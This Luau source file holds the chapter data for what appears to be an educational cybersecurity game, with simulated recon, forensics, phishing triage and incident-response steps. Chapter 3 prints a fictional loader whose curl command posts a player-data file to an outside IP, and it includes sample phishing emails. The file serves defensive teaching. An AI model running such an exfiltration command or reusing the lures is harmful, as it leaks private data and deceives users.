--[[
    ScenarioData.luau
    All chapter definitions for the CyberGame HackTablet.
]]

local ScenarioData = {}

ScenarioData.Chapter1_Recon = {
    type = "terminal",
    title = "Chapter 1: Active Reconnaissance",
    objective = "Map the exposed network, inspect live packet traffic, and confirm the weak path into the admin side.",
    welcomeMessage = [[
HACKTABLET v2.4  -  ACTIVE RECON MODE
Objective: Find the exposed path before the attacker fully weaponizes it.

You are close enough to see multiple Bloxplay networks from outside the office.
Use the terminal and the browser packet analyzer together to understand how the environment is exposed.
Type help to review the available tools.
]],
    steps = {
        {
            id = "ch1_help",
            instruction = "Review your toolset. Type: help",
            hint = "Start by checking what the tablet can already do before touching the network.",
            suggestedCommand = "help",
            validCommands = { "help" },
            output = [[
[*] HackOS SIM commands loaded.
    Key tools for this mission:
      terminal recon
      browser packet review
      targeted host capture
[*] Use both the terminal and browser to trace the exposed path.
]],
        },
        {
            id = "ch1_scan",
            instruction = "Survey the nearby network. Type: scan nearby",
            hint = "Look broadly first, then focus on the user workstation and the admin-side gateway.",
            suggestedCommand = "scan nearby",
            validCommands = { "scan nearby", "scan" },
            output = [[
[*] Scan target: nearby (sim)
    Bloxplay_ITWifi    [192.168.32.10]  open:53,67,68,80,443   role:Wireless gateway
    Bloxplay_AdminWifi [192.168.43.2]   open:22,80,443,8080    role:Admin wireless gateway
    Laptop             [192.168.32.12]  open:53,80,443,5151    role:Employee workstation
    PlayerData_Vault   [192.168.43.20]  open:22,80,443,445,3306 role:Player profile storage
[*] Finding: the workstation and the admin-side gateway are both visible from the same perimeter.
]],
        },
        {
            id = "ch1_sniff",
            instruction = "Capture terminal-side traffic from the employee workstation. Type: sniff 192.168.32.12",
            hint = "Follow the workstation traffic first. It is touching something more sensitive than it should.",
            suggestedCommand = "sniff the employee workstation",
            validCommands = { "sniff 192.168.32.12" },
            output = [[
[*] Sniffing Laptop (192.168.32.12) ... (sim)
[1] HTTPS 192.168.32.12 -> 192.168.43.2   dns=bloxplay.com/admin
[2] HTTPS 192.168.32.12 -> 192.168.43.20  dns=playerdata.bloxplay.local
[3] HTTP  192.168.43.20 -> 203.44.18.77   dns=sync-edge.bloxcdn.net
[*] Capture complete.
[*] Finding: the workstation can reach both the admin surface and the player-data environment.
]],
        },
        {
            id = "ch1_packetnet",
            instruction = "Open the browser packet analyzer.",
            hint = "Use the browser tool to classify the traffic you just saw from the workstation.",
            suggestedCommand = "Visit RBXPacketNet.com in the browser.",
            validCommands = { "browser_visit rbxpacketnet.com" },
            output = [[
[*] RBXPacketNet loaded.
[*] Target a suspicious host and inspect the colored findings in the capture feed.
]],
        },
        {
            id = "ch1_packets",
            instruction = "Capture the employee workstation inside RBXPacketNet.",
            hint = "Target the user workstation instead of the gateway. The capture feed will tell you which packets are routine and which ones expose risk.",
            suggestedCommand = "Capture the employee workstation in RBXPacketNet.",
            validCommands = { "browser_capture 192.168.32.12" },
            output = [[
[*] RBXPacketNet capture verified for Laptop.
[*] Browser analysis shows exposed admin traffic, sensitive vault access, and suspicious outbound activity in the same path.
]],
        },
        {
            id = "ch1_connect",
            instruction = "Bridge into the admin segment from the terminal.",
            hint = "Use the admin-side gateway you discovered during recon.",
            suggestedCommand = "Connect to the admin-side gateway from your scan results.",
            validCommands = { "connect 192.168.43.2" },
            output = [[
[*] Resolving admin gateway ... (sim)
[*] Connected to Bloxplay_AdminWifi (sim)
[*] You now have access to the admin-side network segment.
[*] Next: move into Chapter 2 and authenticate against the exposed admin portal.
]],
            isLastStep = true,
        },
    },
}

ScenarioData.Chapter2_SSH = {
    type = "terminal",
    title = "Chapter 2: File System Forensics",
    objective = "Recover exposed credentials from the physical note, log into the admin portal, and inspect the PlayerData_Vault for filesystem evidence.",
    welcomeMessage = [[
HACKTABLET v2.4  -  FILE SYSTEM FORENSICS MODE
Objective: Recover access, authenticate, and inspect the vault.

A physical sticky note in the office exposes a real management credential path.
Recover it in the world, use the admin page login, then pivot into the vault for filesystem analysis.
]],
    steps = {
        {
            id = "ch2_note",
            instruction = "Find and inspect the physical Sticky Note in the office.",
            hint = "The credentials are in the world, not inside the browser UI.",
            suggestedCommand = "Inspect the physical Sticky Note model in the office.",
            validCommands = { "world_sticky_note inspect" },
            output = [[
[*] Physical sticky note recovered.
[*] Leaked portal credentials confirmed for the admin surface.
]],
        },
        {
            id = "ch2_admin_portal",
            instruction = "Open the admin portal in the browser.",
            hint = "Use the exposed management site you saw during recon.",
            suggestedCommand = "Visit bloxplay.com/admin in the browser.",
            validCommands = { "browser_visit bloxplay.com/admin" },
            output = [[
[*] Admin login surface confirmed.
[*] The exposed management portal is reachable from the path you mapped in Chapter 1.
]],
        },
        {
            id = "ch2_admin_login",
            instruction = "Use the recovered credentials to log into the admin database in the browser.",
            hint = "The login fields are on the portal. Use the credentials from the physical note.",
            suggestedCommand = "Log into the admin portal database with the credentials from the note.",
            validCommands = { "browser_admin_login bloxplay.com/admin" },
            output = [[
[*] Admin database access granted.
[*] Staff records, player references, and incident tooling are exposed from the same portal.
]],
        },
        {
            id = "ch2_ssh",
            instruction = "Use the same account to access the vault over SSH.",
            hint = "The management account on the note works beyond the browser too.",
            suggestedCommand = "SSH into the vault with the recovered admin account.",
            validCommands = { "ssh bloxplay-admin@192.168.43.20" },
            output = [[
[*] ssh: connecting to PlayerData_Vault ... (sim)
[*] Using credentials recovered from the physical note (sim)
[*] Host key fingerprint verified (sim)
[*] Password accepted (sim)
[*] Welcome bloxplay-admin, connected to PlayerData_Vault
]],
        },
        {
            id = "ch2_ls_root",
            instruction = "Survey the vault root in long-list mode. Type: ls -l /",
            hint = "Get the big picture before digging into any single file.",
            suggestedCommand = "ls -l /",
            validCommands = { "ls -l /", "ls / -l", "ls -l" },
            output = [[
[*] Listing / on PlayerData_Vault (sim)
drwx------ bloxplay-admin vaultops   2 item(s)  home/
drwxr-xr-x root           root       3 item(s)  var/
drwxr-xr-x root           root       3 item(s)  etc/
drwxr-x--- vaultsvc       vaultops   3 item(s)  srv/
-rw-r----- root           secops     302 B      auth.log
-rw-r----- bloxplay-admin vaultops   92 B       report.txt
-rwxr-x--- vaultsvc       vaultops   117 B      sync_jobs.sh
]],
        },
        {
            id = "ch2_cd_srv",
            instruction = "Move into the exported data directory. Type: cd /srv",
            hint = "The live player exports sit under the service data folder.",
            suggestedCommand = "cd /srv",
            validCommands = { "cd /srv", "cd srv" },
            output = [[
[*] Current directory: /srv
[*] You are now inside the live export directory.
]],
        },
        {
            id = "ch2_stat_profiles",
            instruction = "Inspect the metadata for the profile export. Type: stat profiles.csv",
            hint = "Use the metadata command against the player profile export inside /srv.",
            suggestedCommand = "stat profiles.csv",
            validCommands = { "stat profiles.csv", "stat /srv/profiles.csv" },
            output = [[
[*] File: /srv/profiles.csv
[*] Type: file
[*] Owner: vaultsvc:vaultops
[*] Access: -rw-r-----
[*] Summary: Exported player profiles
]],
        },
        {
            id = "ch2_cd_root",
            instruction = "Return to the server root. Type: cd /",
            hint = "Head back to root so you can inspect the core evidence files there.",
            suggestedCommand = "cd /",
            validCommands = { "cd /", "cd .." },
            output = [[
[*] Current directory: /
[*] Returned to the root of PlayerData_Vault.
]],
        },
        {
            id = "ch2_grep",
            instruction = 'Search for failed logins. Type: grep "Failed login" auth.log',
            hint = "Search the auth log for repeated sign-in failures rather than reading it line by line.",
            suggestedCommand = 'grep "Failed login" auth.log',
            validCommands = {
                'grep "failed login" auth.log',
                'grep "failed login" /auth.log',
                "grep failed auth.log",
                "grep failed login auth.log",
            },
            output = [[
[*] Matches for "Failed login" in auth.log:
2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77
[*] All failed attempts originate from the same hostile source.
]],
        },
        {
            id = "ch2_find",
            instruction = "Search the filesystem for the suspicious sync script. Type: find / sync_jobs.sh",
            hint = "Use the file search tool from the root of the server to locate the suspicious artifact.",
            suggestedCommand = "find / sync_jobs.sh",
            validCommands = { "find / sync_jobs.sh", "find / sync_jobs" },
            output = [[
[*] Matches for "sync_jobs.sh" under / (sim)
 /sync_jobs.sh
[*] Suspicious executable located at the server root.
]],
        },
        {
            id = "ch2_cat_report",
            instruction = "Read the server report. Type: cat report.txt",
            hint = "Review the short report file that summarizes what the server already noticed.",
            suggestedCommand = "cat report.txt",
            validCommands = { "cat report.txt", "cat /report.txt" },
            output = [[
--- report.txt ---
Server report (SIM)
- outbound traffic spike detected
- investigate running processes
- review netstat output
[*] Hostile activity confirmed. Proceed to Chapter 3.
]],
            isLastStep = true,
        },
    },
}

ScenarioData.Chapter3_Malware = {
    type = "terminal",
    title = "Chapter 3: Malware Discovery",
    objective = "Triage the staff inbox, isolate the phishing mail, and then follow the live incident trail once WannaWail begins to spread.",
    welcomeMessage = [[
HACKTABLET v2.4  -  MALWARE DISCOVERY MODE
Objective: Clear the suspicious mail queue before the outbreak escalates.

A suspicious burst of mail hit staff inboxes shortly before the admin alerts started.
Open the mail site, classify each message with Report or Pass Through, then move into the admin logs once the incident starts unfolding.
]],
    mailInbox = {
        {
            id = "verify_admin_access",
            sender = "Bloxplay Security Desk <verify@bloxplay-mail.net>",
            subject = "Urgent: verify admin access immediately",
            body = [[Hello team,

We detected unusual sign-in activity on your Bloxplay admin account.
Verify your password immediately at http://bloxplay-security-check.net/verify to avoid suspension and payout interruption.

Click the secure link and confirm your credentials within 10 minutes.

- Bloxplay Security Desk]],
            expectedAction = "report",
        },
        {
            id = "creator_payout_hold",
            sender = "Creator Revenue Escalations <payouts@bloxplay-payments.net>",
            subject = "Creator payout hold requires same-day approval",
            body = [[Finance flagged a payout hold on your creator ledger.

Open the secure release portal below and re-enter your administrator password so pending payouts are not frozen overnight:
http://bloxplay-payout-release.net/finance

Failure to complete this step today may suspend creator transfers.

- Creator Revenue Escalations]],
            expectedAction = "report",
        },
        {
            id = "asset_pack_invoice",
            sender = "Marketplace Billing <invoices@rbx-assets-pay.com>",
            subject = "Invoice attached for licensed asset pack",
            body = [[Hi Operations,

Your licensed asset bundle is now overdue. Download the attached invoice archive and sign in with your admin email to avoid legal escalation.

Invoice portal:
http://rbx-assets-pay.com/open

- Marketplace Billing]],
            expectedAction = "report",
        },
        {
            id = "mfa_reset_notice",
            sender = "Identity Sync Alerts <reset@bloxplay-authsupport.net>",
            subject = "MFA reset notice for bloxplay-admin",
            body = [[A remote MFA reset request was submitted for bloxplay-admin.

If this was you, approve the reset by signing into the recovery console:
http://bloxplay-mfa-reset.net/approve

If you do not respond within 15 minutes your current token will be revoked.

- Identity Sync Alerts]],
            expectedAction = "report",
        },
        {
            id = "weekly_stream_roster",
            sender = "Scheduling Ops <scheduling@bloxplay.com>",
            subject = "Weekly stream roster and call-time updates",
            body = [[Morning team,

Attached is the updated stream roster for this week's creator spotlight blocks. Call-time adjustments only affect Thursday and Friday coverage.

Reply in the scheduling thread if your shift needs to change before 14:00.

- Scheduling Ops]],
            expectedAction = "pass",
        },
        {
            id = "cafeteria_maintenance",
            sender = "Facilities Desk <facilities@bloxplay.com>",
            subject = "Cafeteria maintenance window on Friday",
            body = [[Heads up,

The cafeteria espresso machine and two refrigerators will be offline for facilities maintenance from 13:00 to 15:00 on Friday.

Please label anything in the shared cooler before noon.

- Facilities Desk]],
            expectedAction = "pass",
        },
    },
    steps = {
        {
            id = "ch3_mail_site",
            instruction = "Open the staff mail site in the browser.",
            hint = "The suspicious messages are in the company inbox, not the admin portal yet.",
            suggestedCommand = "Visit mail.bloxplay.com in the browser.",
            validCommands = { "browser_visit mail.bloxplay.com" },
            output = [[
[*] BloxMail inbox opened.
[*] Six new messages are waiting for classification.
]],
        },
        {
            id = "ch3_inbox_triage",
            instruction = "Classify every inbox message in BloxMail using Report or Pass Through.",
            hint = "There are six emails in the queue. All phishing mail must be reported before the outbreak begins.",
            suggestedCommand = "Use the Report / Pass Through buttons in BloxMail.",
            validCommands = { "browser_mail verify_admin_access report" },
            output = [[
[*] Inbox triage complete.
[*] Seconds later, office screens start lighting up with WannaWail banners.
[*] Move to the live admin logs before the spread gets worse.
]],
        },
        {
            id = "ch3_admin_logs",
            instruction = "Open the Security Logs tab on the admin page.",
            hint = "The incident feed is inside the admin portal, not the terminal.",
            suggestedCommand = "Open the Security Logs tab in the admin portal.",
            validCommands = { "browser_admin_tab logs" },
            output = [[
[*] Security log feed opened.
[*] Live alerts are now showing encryption, outbound callbacks, and endpoint impact in real time.
]],
        },
        {
            id = "ch3_psrep",
            instruction = "List the active processes on the vault. Type: psrep",
            hint = "Find what is still running before you touch the files.",
            suggestedCommand = "psrep",
            validCommands = { "psrep", "ps aux" },
            output = [[
PID   NAME                STATUS    HOST=PlayerData_Vault
602   sshd                Running
774   vaultleafd          Running
911   profile-sync        Sleeping
1337  sync_jobs.sh        Running
[*] Finding: PID 1337 looks like active WannaWail behavior.
]],
        },
        {
            id = "ch3_cat_malware",
            instruction = "Read the suspicious sync script. Type: cat sync_jobs.sh",
            hint = "Inspect the script tied to the suspicious process.",
            suggestedCommand = "cat sync_jobs.sh",
            validCommands = { "cat sync_jobs.sh", "cat /sync_jobs.sh" },
            output = [[
--- sync_jobs.sh ---
#!/bin/sh
# WannaWail (fictional) exfil loader
curl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv
[*] The loader is sending player profile data to an external destination.
]],
        },
        {
            id = "ch3_netstat",
            instruction = "Check which remote connection is still alive. Type: netstat",
            hint = "Look for the active external session, not the internal ones.",
            suggestedCommand = "netstat",
            validCommands = { "netstat" },
            output = [[
[*] Active connections on PlayerData_Vault (sim)
tcp  0  0  192.168.43.20:22   192.168.32.12:49822   ESTABLISHED
tcp  0  0  192.168.43.20:443  203.44.18.77:8080     ESTABLISHED
tcp  0  0  192.168.43.20:3306 192.168.43.25:54011   TIME_WAIT
[*] Finding: suspicious outbound connection to the hostile source.
]],
        },
        {
            id = "ch3_malwarescan",
            instruction = "Confirm the malware family with the scanner. Type: malwarescan",
            hint = "Use the scanner after you understand the process and the live connection.",
            suggestedCommand = "malwarescan",
            validCommands = { "malwarescan" },
            output = [[
[*] Malware scanner on PlayerData_Vault (sim)
[!] Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)
[!] IOC: outbound endpoint 203.44.18.77
[*] Recommended actions:
    open RBXIPBlocker.com
    firewall add deny <hostile source>
    kill 1337
    rm sync_jobs.sh
[*] Chapter complete. Proceed to Chapter 4.
]],
            isLastStep = true,
        },
    },
}

ScenarioData.Chapter4_IncidentResponse = {
    type = "terminal",
    title = "Chapter 4: Incident Response",
    objective = "Block the hostile source in the browser, mirror the deny rule on the vault, and finish containment.",
    welcomeMessage = [[
HACKTABLET v2.4  -  INCIDENT RESPONSE MODE
Objective: Kick the attacker out and lock the environment back down.

The hostile session is still active.
Use the browser blocker and the terminal firewall together to cut off access and finish cleanup.
]],
    steps = {
        {
            id = "ch4_visit_blocker",
            instruction = "Open the emergency source blocker in the browser.",
            hint = "There is a dedicated response site for emergency source blocking.",
            suggestedCommand = "Visit RBXIPBlocker.com in the browser.",
            validCommands = { "browser_visit rbxipblocker.com" },
            output = [[
[*] RBXIPBlocker loaded.
[*] Response controls are ready for an emergency source block.
]],
        },
        {
            id = "ch4_block_source",
            instruction = "Block the hostile source through the response site.",
            hint = "Use the source you found in the live logs and vault evidence, not one of the internal systems.",
            suggestedCommand = "Block the hostile source you identified during the investigation.",
            validCommands = { "browser_ipblocker_block 203.44.18.77" },
            output = [[
[*] Browser block issued for the hostile source.
[*] New inbound sessions from that source should now be rejected.
]],
        },
        {
            id = "ch4_firewall",
            instruction = "Create a deny rule on the vault for the same hostile source.",
            hint = "Mirror the browser block with a terminal firewall rule.",
            suggestedCommand = "Create a deny firewall rule for the hostile source from the investigation.",
            validCommands = {
                "firewall add deny 203.44.18.77",
                "firewall deny 203.44.18.77",
                "firewall add block 203.44.18.77",
            },
            output = [[
[*] Firewall deny rule added for the hostile source.
[*] The vault now mirrors the emergency browser block locally.
]],
        },
        {
            id = "ch4_kill",
            instruction = "Terminate the malicious process. Type: kill 1337",
            hint = "Stop the suspicious PID before cleaning up the file it launched.",
            suggestedCommand = "kill 1337",
            validCommands = { "kill 1337" },
            output = [[
[*] Terminated PID 1337 (sync_jobs.sh) (sim)
[*] WannaWail activity halted and data exfiltration stopped.
]],
        },
        {
            id = "ch4_rm",
            instruction = "Remove the loader from the vault. Type: rm sync_jobs.sh",
            hint = "Delete the script after the process is no longer running.",
            suggestedCommand = "rm sync_jobs.sh",
            validCommands = { "rm sync_jobs.sh", "rm /sync_jobs.sh" },
            output = [[
[*] Removed sync_jobs.sh (sim)
[*] WannaWail loader deleted from server.
]],
        },
        {
            id = "ch4_malwarescan_verify",
            instruction = "Run a final malware scan to confirm the system is clean. Type: malwarescan",
            hint = "Verify that the hostile source is blocked and the loader is gone.",
            suggestedCommand = "malwarescan",
            validCommands = { "malwarescan" },
            output = [[
[*] Malware scanner on PlayerData_Vault (sim)
[*] No malware indicators found.
[*] Hostile source - blocked.
[*] PID 1337 - terminated.
[*] sync_jobs.sh - removed.
[*] WannaWail - contained.
[*] System status: SECURED
]],
        },
        {
            id = "ch4_exit",
            instruction = "Close the SSH session now that the system is secured. Type: exit",
            hint = "Close the remote session once the host is clean.",
            suggestedCommand = "exit",
            validCommands = { "exit" },
            output = [[
[*] Connection to PlayerData_Vault closed.
MISSION COMPLETE

The attacker path was identified and blocked.
WannaWail was contained before more data could leave the vault.
]],
            isLastStep = true,
        },
    },
}

return ScenarioData
